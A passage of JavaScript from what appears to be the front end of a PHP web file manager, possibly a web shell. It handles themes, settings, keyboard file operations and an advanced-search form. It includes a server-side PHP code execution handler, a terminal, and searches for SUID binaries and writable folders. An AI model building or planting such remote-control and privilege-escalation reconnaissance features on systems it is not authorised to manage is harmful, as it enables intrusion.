                                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white',
                                htmlContainer: 'p-0'
                            },
                            background: isDarkMode ? '#1F2937' : '#FFFFFF',
                            iconColor: isDarkMode ? '#3B82F6' : '#3B82F6'
                        });
                    })
                    .catch(error => {
                        triggerAlert('warning', error); 
                        console.error('Error executing PHP code:', error); 
                    });
            }
        });
    }
  document.addEventListener('click', function (event) {
    if (event.target.classList.contains('codeme')) {
        excute("oldName", csrf, currentDir, key, isEnc);
    }
});
 
});

function initThemeToggle() {
    const themeToggleBtn = document.getElementById('theme-toggle');
    
    if (localStorage.getItem('color-theme') === 'dark' || 
        (!localStorage.getItem('color-theme') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.classList.add('dark');
    } else {
        document.documentElement.classList.remove('dark');
    }
    
    themeToggleBtn.addEventListener('click', function() {
        document.documentElement.classList.toggle('dark');
        
        if (document.documentElement.classList.contains('dark')) {
            localStorage.setItem('color-theme', 'dark');
        } else {
            localStorage.setItem('color-theme', 'light');
        }
        
        if (window.editor) {
            window.editor.updateOptions({
                theme: document.documentElement.classList.contains('dark') ? 'vs-dark' : 'vs'
            });
        }
    });
}

function initEnhancedTabs() {
    const tabButtons = document.querySelectorAll('[role="tab"]');
    const tabContents = document.querySelectorAll('[role="tabpanel"]');
    
    if (tabButtons.length > 0 && tabContents.length > 0) {
        const firstButton = tabButtons[0];
        const firstTabId = firstButton.getAttribute('data-tabs-target');
        const firstTab = document.querySelector(firstTabId);
        
        if (firstTab) {
            firstTab.classList.remove('hidden');
            firstButton.classList.add('text-blue-600', 'border-blue-600');
            firstButton.classList.remove('text-gray-500', 'border-transparent');
            firstButton.setAttribute('aria-selected', 'true');
        }
    }
    
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const targetId = button.getAttribute('data-tabs-target');
            const targetContent = document.querySelector(targetId);
            
            tabContents.forEach(content => {
                content.classList.add('hidden');
            });
            
            tabButtons.forEach(btn => {
                btn.classList.remove('text-blue-600', 'border-blue-600');
                btn.classList.add('text-gray-500', 'border-transparent');
                btn.setAttribute('aria-selected', 'false');
            });
            
            button.classList.add('text-blue-600', 'border-blue-600');
            button.classList.remove('text-gray-500', 'border-transparent');
            button.setAttribute('aria-selected', 'true');
            
            if (targetContent) {
                targetContent.classList.remove('hidden');
            }
            
            if (typeof handleTabSwitch === 'function') {
                handleTabSwitch(targetId);
            }
        });
    });
}

function initSettings() {
    loadSettings();
    
    document.getElementById('light-theme-btn')?.addEventListener('click', () => {
        document.documentElement.classList.remove('dark');
        localStorage.setItem('color-theme', 'light');
        updateEditorTheme('vs');
    });
    
    document.getElementById('dark-theme-btn')?.addEventListener('click', () => {
        document.documentElement.classList.add('dark');
        localStorage.setItem('color-theme', 'dark');
        updateEditorTheme('vs-dark');
    });
    
    document.getElementById('system-theme-btn')?.addEventListener('click', () => {
        localStorage.removeItem('color-theme');
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
            updateEditorTheme('vs-dark');
        } else {
            document.documentElement.classList.remove('dark');
            updateEditorTheme('vs');
        }
    });
    
    const fontSizeSlider = document.getElementById('font-size');
    if (fontSizeSlider) {
        fontSizeSlider.addEventListener('input', (e) => {
            const fontSize = e.target.value;
            document.documentElement.style.fontSize = fontSize + 'px';
            localStorage.setItem('font-size', fontSize);
        });
    }
    
    const terminalFontSizeSlider = document.getElementById('terminal-font-size');
    if (terminalFontSizeSlider) {
        terminalFontSizeSlider.addEventListener('input', (e) => {
            const fontSize = e.target.value;
            const terminalContent = document.querySelector('terminal content');
            if (terminalContent) {
                terminalContent.style.fontSize = fontSize + 'px';
            }
            localStorage.setItem('terminal-font-size', fontSize);
        });
    }
    
    const enableAnimations = document.getElementById('enable-animations');
    if (enableAnimations) {
        enableAnimations.addEventListener('change', (e) => {
            document.body.classList.toggle('disable-animations', !e.target.checked);
            localStorage.setItem('enable-animations', e.target.checked);
        });
    }

    const showHiddenFiles = document.getElementById('show-hidden');
    if (showHiddenFiles) {
        showHiddenFiles.addEventListener('change', (e) => {
            localStorage.setItem('show-hidden-files', e.target.checked);
            loadDirectory(currentDir, 1, csrf, key, isEnc);
        });
    }

    const showFileSize = document.getElementById('show-file-size');
    if (showFileSize) {
        showFileSize.addEventListener('change', (e) => {
            localStorage.setItem('show-file-size', e.target.checked);
            loadDirectory(currentDir, 1, csrf, key, isEnc);
        });
    }

    const showFileDate = document.getElementById('show-file-date');
    if (showFileDate) {
        showFileDate.addEventListener('change', (e) => {
            localStorage.setItem('show-file-date', e.target.checked);
            loadDirectory(currentDir, 1, csrf, key, isEnc);
        });
    }

    const defaultSort = document.getElementById('default-sort');
    if (defaultSort) {
        defaultSort.addEventListener('change', (e) => {
            localStorage.setItem('default-sort', e.target.value);
            loadDirectory(currentDir, 1, csrf, key, isEnc);
        });
    }

    const terminalWrap = document.getElementById('terminal-wrap');
    if (terminalWrap) {
        terminalWrap.addEventListener('change', (e) => {
            localStorage.setItem('terminal-wrap', e.target.checked);
            if (window.terminal) {
                window.terminal.setOption('wrap', e.target.checked);
            }
        });
    }

    const terminalBell = document.getElementById('terminal-bell');
    if (terminalBell) {
        terminalBell.addEventListener('change', (e) => {
            localStorage.setItem('terminal-bell', e.target.checked);
            if (window.terminal) {
                window.terminal.setOption('bellStyle', e.target.checked ? 'sound' : 'none');
            }
        });
    }

    const terminalTheme = document.getElementById('terminal-theme');
    if (terminalTheme) {
        terminalTheme.addEventListener('change', (e) => {
            localStorage.setItem('terminal-theme', e.target.value);
            if (window.terminal) {
                window.terminal.setOption('theme', e.target.value);
            }
        });
    }

    const editorThemeSelect = document.getElementById('editor-theme');
    if (editorThemeSelect) {
        editorThemeSelect.addEventListener('change', (e) => {
            const theme = e.target.value;
            if (theme === 'system') {
                updateEditorTheme(window.matchMedia('(prefers-color-scheme: dark)').matches ? 'vs-dark' : 'vs');
                localStorage.setItem('editor-theme', 'system');
            } else {
                updateEditorTheme(theme);
                localStorage.setItem('editor-theme', theme);
            }
        });
    }
    
    const tabSizeSelect = document.getElementById('tab-size');
    if (tabSizeSelect) {
        tabSizeSelect.addEventListener('change', (e) => {
            const tabSize = e.target.value;
            if (window.editor) {
                window.editor.setOption('tabSize', parseInt(tabSize));
            }
            localStorage.setItem('tab-size', tabSize);
        });
    }
    
    const wordWrapCheckbox = document.getElementById('word-wrap');
    if (wordWrapCheckbox) {
        wordWrapCheckbox.addEventListener('change', (e) => {
            if (window.editor) {
                window.editor.setOption('lineWrapping', e.target.checked);
            }
            localStorage.setItem('word-wrap', e.target.checked);
        });
    }

    const autoCloseBrackets = document.getElementById('auto-close-brackets');
    if (autoCloseBrackets) {
        autoCloseBrackets.addEventListener('change', (e) => {
            if (window.editor) {
                window.editor.setOption('autoCloseBrackets', e.target.checked);
            }
            localStorage.setItem('auto-close-brackets', e.target.checked);
        });
    }

    const highlightActiveLine = document.getElementById('highlight-active-line');
    if (highlightActiveLine) {
        highlightActiveLine.addEventListener('change', (e) => {
            if (window.editor) {
                window.editor.setOption('styleActiveLine', e.target.checked);
            }
            localStorage.setItem('highlight-active-line', e.target.checked);
        });
    }
    
    const defaultItemsSelect = document.getElementById('default-items');
    if (defaultItemsSelect) {
        defaultItemsSelect.addEventListener('change', (e) => {
            const itemsPerPage = e.target.value;
            localStorage.setItem('default-items-per-page', itemsPerPage);
            
            const itemLimitElement = document.getElementById('itemLimit');
            if (itemLimitElement) {
                itemLimitElement.value = itemsPerPage;
                const event = new Event('change');
                itemLimitElement.dispatchEvent(event);
            }
        });
    }
    
    document.getElementById('save-settings')?.addEventListener('click', () => {
        saveSettings();
        triggerAlert('success', 'Settings saved successfully!');
    });
}

function loadSettings() {
    const fontSize = localStorage.getItem('font-size') || '14';
    document.documentElement.style.fontSize = fontSize + 'px';
    const fontSizeSlider = document.getElementById('font-size');
    if (fontSizeSlider) fontSizeSlider.value = fontSize;
    
    const terminalFontSize = localStorage.getItem('terminal-font-size') || '14';
    const terminalContent = document.querySelector('terminal content');
    if (terminalContent) terminalContent.style.fontSize = terminalFontSize + 'px';
    const terminalFontSizeSlider = document.getElementById('terminal-font-size');
    if (terminalFontSizeSlider) terminalFontSizeSlider.value = terminalFontSize;

    const enableAnimations = localStorage.getItem('enable-animations') !== 'false';
    document.body.classList.toggle('disable-animations', !enableAnimations);
    const animationsCheckbox = document.getElementById('enable-animations');
    if (animationsCheckbox) animationsCheckbox.checked = enableAnimations;

    const showHidden = localStorage.getItem('show-hidden-files') === 'true';
    const showHiddenCheckbox = document.getElementById('show-hidden');
    if (showHiddenCheckbox) showHiddenCheckbox.checked = showHidden;

    const showFileSize = localStorage.getItem('show-file-size') !== 'false';
    const showFileSizeCheckbox = document.getElementById('show-file-size');
    if (showFileSizeCheckbox) showFileSizeCheckbox.checked = showFileSize;

    const showFileDate = localStorage.getItem('show-file-date') !== 'false';
    const showFileDateCheckbox = document.getElementById('show-file-date');
    if (showFileDateCheckbox) showFileDateCheckbox.checked = showFileDate;

    const defaultSort = localStorage.getItem('default-sort') || 'date-desc';
    const defaultSortSelect = document.getElementById('default-sort');
    if (defaultSortSelect) defaultSortSelect.value = defaultSort;

    const terminalWrap = localStorage.getItem('terminal-wrap') !== 'false';
    const terminalWrapCheckbox = document.getElementById('terminal-wrap');
    if (terminalWrapCheckbox) terminalWrapCheckbox.checked = terminalWrap;

    const terminalBell = localStorage.getItem('terminal-bell') === 'true';
    const terminalBellCheckbox = document.getElementById('terminal-bell');
    if (terminalBellCheckbox) terminalBellCheckbox.checked = terminalBell;

    const terminalTheme = localStorage.getItem('terminal-theme') || 'default';
    const terminalThemeSelect = document.getElementById('terminal-theme');
    if (terminalThemeSelect) terminalThemeSelect.value = terminalTheme;
    
    const editorTheme = localStorage.getItem('editor-theme') || 'system';
    const editorThemeSelect = document.getElementById('editor-theme');
    if (editorThemeSelect) editorThemeSelect.value = editorTheme;
    
    const tabSize = localStorage.getItem('tab-size') || '4';
    const tabSizeSelect = document.getElementById('tab-size');
    if (tabSizeSelect) tabSizeSelect.value = tabSize;
    
    const wordWrap = localStorage.getItem('word-wrap') !== 'false';
    const wordWrapCheckbox = document.getElementById('word-wrap');
    if (wordWrapCheckbox) wordWrapCheckbox.checked = wordWrap;

    const autoCloseBrackets = localStorage.getItem('auto-close-brackets') !== 'false';
    const autoCloseBracketsCheckbox = document.getElementById('auto-close-brackets');
    if (autoCloseBracketsCheckbox) autoCloseBracketsCheckbox.checked = autoCloseBrackets;

    const highlightActiveLine = localStorage.getItem('highlight-active-line') !== 'false';
    const highlightActiveLineCheckbox = document.getElementById('highlight-active-line');
    if (highlightActiveLineCheckbox) highlightActiveLineCheckbox.checked = highlightActiveLine;
    
    const defaultItems = localStorage.getItem('default-items-per-page') || '50';
    const defaultItemsSelect = document.getElementById('default-items');
    if (defaultItemsSelect) defaultItemsSelect.value = defaultItems;
    
    const itemLimitElement = document.getElementById('itemLimit');
    if (itemLimitElement && defaultItems) {
        itemLimitElement.value = defaultItems;
    }
}

function saveSettings() {
    const fontSizeSlider = document.getElementById('font-size');
    if (fontSizeSlider) localStorage.setItem('font-size', fontSizeSlider.value);
    
    const terminalFontSizeSlider = document.getElementById('terminal-font-size');
    if (terminalFontSizeSlider) localStorage.setItem('terminal-font-size', terminalFontSizeSlider.value);

    const enableAnimations = document.getElementById('enable-animations');
    if (enableAnimations) localStorage.setItem('enable-animations', enableAnimations.checked);

    const showHidden = document.getElementById('show-hidden');
    if (showHidden) localStorage.setItem('show-hidden-files', showHidden.checked);

    const showFileSize = document.getElementById('show-file-size');
    if (showFileSize) localStorage.setItem('show-file-size', showFileSize.checked);

    const showFileDate = document.getElementById('show-file-date');
    if (showFileDate) localStorage.setItem('show-file-date', showFileDate.checked);

    const defaultSort = document.getElementById('default-sort');
    if (defaultSort) localStorage.setItem('default-sort', defaultSort.value);

    const terminalWrap = document.getElementById('terminal-wrap');
    if (terminalWrap) localStorage.setItem('terminal-wrap', terminalWrap.checked);

    const terminalBell = document.getElementById('terminal-bell');
    if (terminalBell) localStorage.setItem('terminal-bell', terminalBell.checked);

    const terminalTheme = document.getElementById('terminal-theme');
    if (terminalTheme) localStorage.setItem('terminal-theme', terminalTheme.value);
    
    const editorThemeSelect = document.getElementById('editor-theme');
    if (editorThemeSelect) localStorage.setItem('editor-theme', editorThemeSelect.value);
    
    const tabSizeSelect = document.getElementById('tab-size');
    if (tabSizeSelect) localStorage.setItem('tab-size', tabSizeSelect.value);
    
    const wordWrapCheckbox = document.getElementById('word-wrap');
    if (wordWrapCheckbox) localStorage.setItem('word-wrap', wordWrapCheckbox.checked);

    const autoCloseBrackets = document.getElementById('auto-close-brackets');
    if (autoCloseBrackets) localStorage.setItem('auto-close-brackets', autoCloseBrackets.checked);

    const highlightActiveLine = document.getElementById('highlight-active-line');
    if (highlightActiveLine) localStorage.setItem('highlight-active-line', highlightActiveLine.checked);
    
    const defaultItemsSelect = document.getElementById('default-items');
    if (defaultItemsSelect) localStorage.setItem('default-items-per-page', defaultItemsSelect.value);
}

function updateEditorTheme(theme) {
    window.editorThemePreference = theme;
    
    let codeMirrorTheme = 'eclipse'; 
    
    if (theme === 'vs-dark' || 
        (theme === 'system' && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        codeMirrorTheme = 'dracula'; 
    }
    
    if (window.editor && typeof window.editor.setOption === 'function') {
        try {
            window.editor.setOption('theme', codeMirrorTheme);
            
            const editorContainer = document.getElementById('editorContainer');
            if (editorContainer) {
                if (codeMirrorTheme === 'dracula') {
                    editorContainer.classList.add('dark-editor');
                    editorContainer.classList.remove('light-editor');
                } else {
                    editorContainer.classList.add('light-editor');
                    editorContainer.classList.remove('dark-editor');
                }
            }
            
            const editorStatus = document.getElementById('editorStatus');
            if (editorStatus) {
                if (codeMirrorTheme === 'dracula') {
                    editorStatus.classList.add('dark-status');
                    editorStatus.classList.remove('light-status');
                } else {
                    editorStatus.classList.add('light-status');
                    editorStatus.classList.remove('dark-status');
                }
            }
            
            console.log('Editor theme updated to:', codeMirrorTheme);
        } catch (error) {
            console.error('Error updating editor theme:', error);
        }
    } else {
        console.log('CodeMirror editor not available, theme will be applied when editor loads');
    }
}

window.initEditorLanguageSelector = function() {
    const languageSelector = document.getElementById('editorLanguage');
    if (!languageSelector || languageSelector.dataset.initialized) return;
    
    languageSelector.addEventListener('change', function() {
        const selectedMode = this.value;
        if (window.editor && selectedMode) {
            try {
                window.editor.setOption('mode', selectedMode);
                console.log('Editor mode changed to:', selectedMode);
                
                const statusEl = document.getElementById('editorStatus');
                if (statusEl) {
                    const currentText = statusEl.textContent || '';
                    const updatedText = currentText.replace(/\|.*\|/, `| ${selectedMode} |`);
                    statusEl.textContent = updatedText;
                }
            } catch (error) {
                console.error('Error changing editor mode:', error);
            }
        }
    });
    
    languageSelector.dataset.initialized = 'true';
    console.log('Editor language selector initialized');
};

function initGlobalKeyboardShortcuts() {
    const shortcutHelp = [
        { key: 'Delete', action: 'Delete selected files' },
        { key: 'Ctrl+A', action: 'Select all files' },
        { key: 'Ctrl+C', action: 'Copy selected files' },
        { key: 'Ctrl+X', action: 'Cut selected files' },
        { key: 'Ctrl+V', action: 'Paste files' },
        { key: 'Ctrl+F', action: 'Search files (when implemented)' },
        { key: 'F2', action: 'Rename selected file' },
        { key: 'F5', action: 'Refresh directory' },
        { key: 'Alt+Up', action: 'Navigate to parent directory' },
        { key: 'Escape', action: 'Deselect all files / Close dialogs' },
        { key: '?', action: 'Show this help dialog' }
    ];
    
    function showKeyboardShortcutsHelp() {
        let shortcutsHtml = '<div class="overflow-x-auto"><table class="w-full text-sm text-left">';
        shortcutsHtml += '<thead class="text-xs uppercase bg-gray-100 dark:bg-gray-700"><tr><th class="px-6 py-3">Key</th><th class="px-6 py-3">Action</th></tr></thead><tbody>';
        
        shortcutHelp.forEach(item => {
            shortcutsHtml += `<tr class="border-b dark:border-gray-700"><td class="px-6 py-4 font-medium">${item.key}</td><td class="px-6 py-4">${item.action}</td></tr>`;
        });
        
        shortcutsHtml += '</tbody></table></div>';
        
        Swal.fire({
            title: 'Keyboard Shortcuts',
            html: shortcutsHtml,
            customClass: {
                popup: 'dark:bg-gray-800 dark:text-white'
            }
        });
    }
    
    if (keyboardShortcutsBtn) {
        keyboardShortcutsBtn.addEventListener('click', showKeyboardShortcutsHelp);
    }
    
    document.addEventListener('keydown', function(e) {
        if (e.target.tagName === 'INPUT' || 
            e.target.tagName === 'TEXTAREA' || 
            e.target.classList.contains('CodeMirror') ||
            document.querySelector('#terminal:not(.hidden)')) {
            return;
        }
        
        if (!window.fileManagerState) {
            console.error('fileManagerState is not initialized');
            return;
        }
        
        const currentDir = window.fileManagerState?.currentDir || phpVars?.currentDir;
        
        if (!window.fileManagerState.selectedFiles) {
            window.fileManagerState.selectedFiles = [];
        }
        
        const selectedFiles = window.fileManagerState.selectedFiles || [];
        
        console.log('Keyboard shortcut detected:', e.key, 'Ctrl:', e.ctrlKey, 'Alt:', e.altKey);
        console.log('Selected files:', selectedFiles);
        
        switch (true) {
            case e.key === 'Delete':
                console.log('Delete key pressed, selected files:', selectedFiles.length);
                if (selectedFiles.length > 0) {
                    e.preventDefault();
                    
                    if (document.activeElement.tagName === 'INPUT' || 
                        document.activeElement.tagName === 'TEXTAREA' || 
                        document.activeElement.isContentEditable) {
                        return; 
                    }
                    
                    const filesToDelete = [...selectedFiles];
                    
                    window.showConfirmation(
                        'Delete Files',
                        `Are you sure you want to delete ${filesToDelete.length} file(s)?`,
                        'Delete',
                        () => {
                            console.log('Files to delete:', filesToDelete);
                            
                            if (typeof window.sendBulkActionRequest === 'function') {
                                window.sendBulkActionRequest({
                                    action: 'delete',
                                    files: filesToDelete,
                                    onSuccess: () => {
                                        if (typeof window.clearFileSelection === 'function') {
                                            window.clearFileSelection();
                                        }
                                        
                                        window.triggerAlert('success', 'Files deleted successfully');
                                        window.loadDirectory(currentDir, 1, csrf, key, isEnc);
                                    }
                                });
                            } else {
                                window.performBulkAction('delete', filesToDelete, currentDir, csrf, key, isEnc);
                            }
                        }
                    );
                }
                break;
            
            case e.ctrlKey && e.key === 'a':
                console.log('Ctrl+A pressed');
                e.preventDefault();
                const checkboxes = document.querySelectorAll('.file-checkbox');
                const selectAllCheckbox = document.getElementById('selectAll');
                
                checkboxes.forEach(checkbox => {
                    checkbox.checked = true;
                    window.updateSelectedFiles(checkbox.dataset.file, true);
                });
                
                if (selectAllCheckbox) {
                    selectAllCheckbox.checked = true;
                }
                
                window.triggerAlert('info', `Selected ${checkboxes.length} file(s)`);
                break;
            
            case e.ctrlKey && e.key === 'c':
                console.log('Ctrl+C pressed, selected files:', selectedFiles.length);
                if (selectedFiles.length > 0) {
                    e.preventDefault();
                    
                    if (document.activeElement.tagName === 'INPUT' || 
                        document.activeElement.tagName === 'TEXTAREA' || 
                        document.activeElement.isContentEditable) {
                        return; 
                    }
                    
                    const filesWithPaths = selectedFiles.map(file => {
                        if (!file.includes('/')) {
                            return `${currentDir}/${file}`;
                        }
                        return file;
                    });
                    
                    if (typeof window.saveToLocalStorage === 'function') {
                    window.saveToLocalStorage(filesWithPaths);
                    
                    localStorage.removeItem('clipboard-action');
                    
                    window.triggerAlert('success', `Copied ${selectedFiles.length} file(s) to clipboard`);
                    } else {
                        console.error('saveToLocalStorage function not found');
                        window.triggerAlert('warning', 'Copy operation failed');
                    }
                }
                break;
            
            case e.ctrlKey && e.key === 'x':
                console.log('Ctrl+X pressed, selected files:', selectedFiles.length);
                if (selectedFiles.length > 0) {
                    e.preventDefault();
                    
                    if (document.activeElement.tagName === 'INPUT' || 
                        document.activeElement.tagName === 'TEXTAREA' || 
                        document.activeElement.isContentEditable) {
                        return; 
                    }
                    
                    const filesWithPaths = selectedFiles.map(file => {
                        if (!file.includes('/')) {
                            return `${currentDir}/${file}`;
                        }
                        return file;
                    });
                    
                    if (typeof window.saveToLocalStorage === 'function') {
                    window.saveToLocalStorage(filesWithPaths);
                    
                    localStorage.setItem('clipboard-action', 'cut');
                    
                    window.triggerAlert('info', `Cut ${selectedFiles.length} file(s) to clipboard`);
                    } else {
                        console.error('saveToLocalStorage function not found');
                        window.triggerAlert('warning', 'Cut operation failed');
                    }
                }
                break;
            
            case e.ctrlKey && e.key === 'v':
                console.log('Ctrl+V pressed');
                
                if (document.activeElement.tagName === 'INPUT' || 
                    document.activeElement.tagName === 'TEXTAREA' || 
                    document.activeElement.isContentEditable) {
                    return; 
                }
                
                e.preventDefault();
                
                if (typeof window.getFromLocalStorage === 'function') {
                const files = window.getFromLocalStorage();
                    
                if (files && files.length > 0) {
                    console.log('Pasting files:', files);
                    console.log('Current directory:', currentDir);
                    
                    window.triggerAlert('info', `Pasting ${files.length} item(s)...`);
                    
                        if (typeof window.sendBulkActionRequest === 'function') {
                            window.sendBulkActionRequest({
                                action: 'paste',
                                files: files,
                                onSuccess: () => {
                                    if (typeof window.clearFileSelection === 'function') {
                                        window.clearFileSelection();
                                    }
                                    
                                    window.triggerAlert('success', 'Files pasted successfully');
                                    window.loadDirectory(currentDir, 1, csrf, key, isEnc);
                                    
                                    if (localStorage.getItem('clipboard-action') === 'cut') {
                                        if (typeof window.freeclipbroad === 'function') {
                                            window.freeclipbroad();
                                        }
                                        localStorage.removeItem('clipboard-action');
                                    }
                                }
                            });
                        } else {
                    window.performBulkAction('paste', files, currentDir, csrf, key, isEnc);
                    
                            if (localStorage.getItem('clipboard-action') === 'cut') {
                                if (typeof window.freeclipbroad === 'function') {
                    window.freeclipbroad();
                                }
                    localStorage.removeItem('clipboard-action');
                            }
                        }
                } else {
                    window.triggerAlert('warning', 'No items in clipboard');
                    }
                } else {
                    console.error('getFromLocalStorage function not found');
                    window.triggerAlert('warning', 'Paste operation failed');
                }
                break;
            
            case e.key === 'F2':
                console.log('F2 pressed, selected files:', selectedFiles.length);
                if (selectedFiles.length === 1) {
                    e.preventDefault();
                    window.renameFile(selectedFiles[0], csrf, currentDir, key, isEnc);
                } else if (selectedFiles.length > 1) {
                    window.triggerAlert('warning', 'Please select only one file to rename');
                }
                break;
            
            case e.key === 'F5':
                console.log('F5 pressed');
                e.preventDefault();
                window.loadDirectory(currentDir, 1, csrf, key, isEnc);
                window.triggerAlert('info', 'Refreshing directory...');
                break;
            
            case e.altKey && e.key === 'ArrowUp':
                console.log('Alt+Up pressed');
                e.preventDefault();
                const parentDirBtn = document.querySelector('.breadcrumb-item:nth-last-child(2) a');
                if (parentDirBtn) {
                    parentDirBtn.click();
                }
                break;
            
            case e.key === 'Escape':
                console.log('Escape pressed');
                const visibleModal = document.querySelector('.modal:not(.hidden)');
                const visibleContextMenu = document.querySelector('#context-menu:not(.hidden)');
                
                if (visibleModal || visibleContextMenu) {
                    return;
                }
                
                e.preventDefault();
                document.querySelectorAll('.file-checkbox').forEach(checkbox => {
                    checkbox.checked = false;
                });
                
                const selectAllCheckboxEsc = document.getElementById('selectAll');
                if (selectAllCheckboxEsc) {
                    selectAllCheckboxEsc.checked = false;
                }
                
                window.fileManagerState.selectedFiles = [];
                
                window.triggerAlert('info', 'Deselected all files');
                break;
            
            case e.key === '?':
                console.log('? key pressed');
                e.preventDefault();
                showKeyboardShortcutsHelp();
                break;
        }
    });
    
 }

function exposeUtilityFunctions() {
    window.updateSelectedFiles = typeof updateSelectedFiles === 'function' ? 
        updateSelectedFiles : function() { console.error('updateSelectedFiles not found'); };
        
    window.showAdvancedSearch = function() {
        if (!window.phpVars) {
            console.error('phpVars not found');
            triggerAlert('danger', 'Required configuration is missing. Please refresh the page and try again.');
            return;
        }
        
        const tabName = 'Advanced Search';
        const tabId = addNewTab(tabName, 'search');
        
        switchToTab(tabId);
        
        const tabContent = document.getElementById(`${tabId}-content`);
        if (!tabContent) {
            console.error('Search tab content not found');
            return;
        }
        
        tabContent.innerHTML = '';
        
        const searchForm = document.createElement('div');
        searchForm.className = 'search-form bg-white dark:bg-gray-800 p-4 rounded-lg shadow mb-4';
        searchForm.innerHTML = `
            <h2 class="text-xl font-semibold mb-4 text-gray-800 dark:text-white">Advanced Search</h2>
            <form id="advanced-search-form" class="space-y-4" onsubmit="event.preventDefault(); performAdvancedSearch(); return false;">
                <!-- Search Mode Selector -->
                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Search Mode</label>
                    <div class="flex space-x-4">
                        <label class="inline-flex items-center">
                            <input type="radio" name="search-mode" value="text" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300" checked onchange="toggleSearchMode('text')">
                            <span class="ml-2 text-sm text-gray-700 dark:text-gray-300">Text Search</span>
                        </label>
                        <label class="inline-flex items-center">
                            <input type="radio" name="search-mode" value="permission" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300" onchange="toggleSearchMode('permission')">
                            <span class="ml-2 text-sm text-gray-700 dark:text-gray-300">Permission Search</span>
                        </label>
                    </div>
                </div>

                <!-- Common Settings -->
                <div class="mb-4">
                    <div>
                        <label for="search-path" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Search Path</label>
                        <input type="text" id="search-path" name="search-path" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white" placeholder="Directory path" value="${window.fileManagerState?.currentDir || '.'}">
                    </div>
                </div>

                <!-- Text Search Section -->
                <div id="text-search-section" class="space-y-4">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label for="search-query" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Search Query</label>
                            <input type="text" id="search-query" name="search-query" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white" placeholder="Enter search text or pattern">
                        </div>
                    <div>
                        <label for="file-extensions" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">File Extensions</label>
                        <input type="text" id="file-extensions" name="file-extensions" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white" placeholder="e.g. php,js,html,css">
                    </div>
                    </div>

                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
                        <h3 class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">Text Search Options</h3>
                        <div class="space-y-2">
                        <div class="flex items-center">
                            <input type="checkbox" id="case-sensitive" name="case-sensitive" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                            <label for="case-sensitive" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Case Sensitive</label>
                        </div>
                        <div class="flex items-center">
                            <input type="checkbox" id="use-regex" name="use-regex" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                            <label for="use-regex" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Use Regex</label>
                        </div>
                        </div>
                    </div>
                </div>

                <!-- Permission Search Section -->
                <div id="permission-search-section" class="space-y-4 hidden">
                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
                        <h3 class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">Permission Filters</h3>
                        <div class="space-y-2">
                        <div class="flex items-center">
                            <input type="checkbox" id="writable-only" name="writable-only" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                            <label for="writable-only" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Writable Files Only</label>
                        </div>
                            <div class="flex items-center">
                                <input type="checkbox" id="writable-folders" name="writable-folders" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                <label for="writable-folders" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Writable Folders Only</label>
                            </div>
                            <div class="flex items-center">
                                <input type="checkbox" id="executable-only" name="executable-only" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                <label for="executable-only" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Executable Files</label>
                            </div>
                            <div class="flex items-center">
                                <input type="checkbox" id="suid-binaries" name="suid-binaries" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                <label for="suid-binaries" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">SUID Binaries</label>
                            </div>
                            <div class="flex items-center">
                                <input type="checkbox" id="include-hidden" name="include-hidden" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                <label for="include-hidden" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Include Hidden Files/Folders</label>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Common Options -->
                <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
                    <h3 class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">Search Settings</h3>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label for="max-results" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Max Results</label>
                            <input type="number" id="max-results" name="max-results" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white" value="1000" min="10" max="10000">
                        </div>
                        <div>
                            <label for="batch-size" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Batch Size</label>
